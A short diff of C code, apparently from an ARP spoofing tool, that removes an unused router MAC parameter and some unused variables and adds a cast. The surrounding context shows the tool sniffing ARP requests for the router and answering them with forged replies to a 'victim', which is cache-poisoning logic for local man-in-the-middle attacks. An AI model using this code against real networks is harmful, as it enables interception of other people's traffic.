@@ -20,7 +20,7 @@ struct arp_response {
 	struct arp_ethip arp_payload;
 } __attribute__((__packed__));
 
-void arp_answer(eth_addr_t victim_mac, eth_addr_t router_mac, uint8_t *victim_ip, uint8_t *router_ip) {
+void arp_answer(eth_addr_t victim_mac, uint8_t *victim_ip, uint8_t *router_ip) {
 
 	struct arp_response packet;
 	int ret;
@@ -75,10 +75,8 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 	struct eth_hdr eth_pack;
 	eth_addr_t router_mac_addr;
 	uint16_t type;
-	ip_addr_t ip_addr_dest;
-	eth_addr_t eth_addr_dest;
 	ip_addr_t router_ip_addr;
-	char *arguments = strdup(args);
+	char *arguments = strdup((char *)args);
 	char *ip_router_string;
 	char *mac_router_string;
 	char *my_mac;
@@ -133,7 +131,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		printf("\t[ARP (opcode = 0x%04X) detected]\n", opcode);
 		if ( (memcmp(&router_ip_addr, &target_ip_addr, IP_ADDR_LEN) == 0) && (opcode == ARP_OP_REQUEST) ) {
 			printf("\t\t[Intercepted ARP request for the Router] we gotta answer !\n\n");
-			arp_answer(eth_pack.eth_src, router_mac_addr, arp_payload.ar_spa, arp_payload.ar_tpa);
+			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
 
 		}
 	} else if (type == ETH_TYPE_IP) {
